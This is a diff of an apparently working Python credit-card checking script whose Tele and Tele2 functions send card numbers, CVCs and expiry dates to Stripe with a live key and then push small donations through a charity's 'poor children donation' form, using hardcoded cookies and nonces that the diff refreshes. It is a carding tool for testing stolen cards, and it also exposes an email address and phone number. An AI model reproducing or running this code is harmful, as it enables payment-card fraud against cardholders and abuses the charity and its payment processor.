@@ -56,7 +56,7 @@ def Tele(ccx):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=f6b9ae31-5a24-4e70-a182-d70929a90b900fcb73&payment_user_agent=stripe.js%2Fe1d6ae399a%3B+stripe-js-v3%2Fe1d6ae399a%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=39200&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
+	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=b688e788-7fce-435e-81f7-da6997a99c7eed6010&pasted_fields=number&payment_user_agent=stripe.js%2F957f55b385%3B+stripe-js-v3%2F957f55b385%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=29667&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
@@ -66,9 +66,9 @@ def Tele(ccx):
             '_ga': 'GA1.1.1027315439.1730043864',
             '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
             'charitable_session': '8f740c3da2e3c427c44b3d2b4c2b544f||86400||82800',
-            '_ga_M3WG7TPY0P': 'GS1.1.1731041201.26.1.1731041255.0.0.0',
-            '__stripe_sid': 'f6b9ae31-5a24-4e70-a182-d70929a90b900fcb73',
-            '_ga_9S894YGECP': 'GS1.1.1731041202.26.1.1731041264.0.0.0',
+            '__stripe_sid': 'b688e788-7fce-435e-81f7-da6997a99c7eed6010',
+            '_ga_M3WG7TPY0P': 'GS1.1.1731129803.28.1.1731129883.0.0.0',
+            '_ga_9S894YGECP': 'GS1.1.1731129805.28.1.1731129890.0.0.0',
 	}
 
 	headers = {
@@ -76,7 +76,7 @@ def Tele(ccx):
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=8f740c3da2e3c427c44b3d2b4c2b544f||86400||82800; _ga_M3WG7TPY0P=GS1.1.1731041201.26.1.1731041255.0.0.0; __stripe_sid=f6b9ae31-5a24-4e70-a182-d70929a90b900fcb73; _ga_9S894YGECP=GS1.1.1731041202.26.1.1731041264.0.0.0',
+            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=8f740c3da2e3c427c44b3d2b4c2b544f||86400||82800; __stripe_sid=b688e788-7fce-435e-81f7-da6997a99c7eed6010; _ga_M3WG7TPY0P=GS1.1.1731129803.28.1.1731129883.0.0.0; _ga_9S894YGECP=GS1.1.1731129805.28.1.1731129890.0.0.0',
             'origin': 'https://needhelped.com',
             'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
@@ -91,9 +91,9 @@ def Tele(ccx):
 
 
 	data = {
-            'charitable_form_id': '672d97e5f2104',
-            '672d97e5f2104': '',
-            '_charitable_donation_nonce': 'c715beb34c',
+            'charitable_form_id': '672ef21a3d0e0',
+            '672ef21a3d0e0': '',
+            '_charitable_donation_nonce': 'c07d420c02',
             '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
             'campaign_id': '1164',
             'description': 'Poor Children Donation Support',
@@ -128,8 +128,6 @@ def Tele(ccx):
 		return 'success' or 'Thank You'
 	return ii
 
-
-	
 import requests,re
 def Tele2(ccx):
 	import requests
@@ -159,7 +157,7 @@ def Tele2(ccx):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=f6b9ae31-5a24-4e70-a182-d70929a90b900fcb73&payment_user_agent=stripe.js%2Fe1d6ae399a%3B+stripe-js-v3%2Fe1d6ae399a%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=39200&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
+	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=b688e788-7fce-435e-81f7-da6997a99c7eed6010&pasted_fields=number&payment_user_agent=stripe.js%2F957f55b385%3B+stripe-js-v3%2F957f55b385%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=29667&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
@@ -169,9 +167,9 @@ def Tele2(ccx):
             '_ga': 'GA1.1.1027315439.1730043864',
             '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
             'charitable_session': '8f740c3da2e3c427c44b3d2b4c2b544f||86400||82800',
-            '_ga_M3WG7TPY0P': 'GS1.1.1731041201.26.1.1731041255.0.0.0',
-            '__stripe_sid': 'f6b9ae31-5a24-4e70-a182-d70929a90b900fcb73',
-            '_ga_9S894YGECP': 'GS1.1.1731041202.26.1.1731041264.0.0.0',
+            '__stripe_sid': 'b688e788-7fce-435e-81f7-da6997a99c7eed6010',
+            '_ga_M3WG7TPY0P': 'GS1.1.1731129803.28.1.1731129883.0.0.0',
+            '_ga_9S894YGECP': 'GS1.1.1731129805.28.1.1731129890.0.0.0',
 	}
 
 	headers = {
@@ -179,7 +177,7 @@ def Tele2(ccx):
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=8f740c3da2e3c427c44b3d2b4c2b544f||86400||82800; _ga_M3WG7TPY0P=GS1.1.1731041201.26.1.1731041255.0.0.0; __stripe_sid=f6b9ae31-5a24-4e70-a182-d70929a90b900fcb73; _ga_9S894YGECP=GS1.1.1731041202.26.1.1731041264.0.0.0',
+            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=8f740c3da2e3c427c44b3d2b4c2b544f||86400||82800; __stripe_sid=b688e788-7fce-435e-81f7-da6997a99c7eed6010; _ga_M3WG7TPY0P=GS1.1.1731129803.28.1.1731129883.0.0.0; _ga_9S894YGECP=GS1.1.1731129805.28.1.1731129890.0.0.0',
             'origin': 'https://needhelped.com',
             'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
@@ -194,9 +192,9 @@ def Tele2(ccx):
 
 
 	data = {
-            'charitable_form_id': '672d97e5f2104',
-            '672d97e5f2104': '',
-            '_charitable_donation_nonce': 'c715beb34c',
+            'charitable_form_id': '672ef21a3d0e0',
+            '672ef21a3d0e0': '',
+            '_charitable_donation_nonce': 'c07d420c02',
             '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
             'campaign_id': '1164',
             'description': 'Poor Children Donation Support',
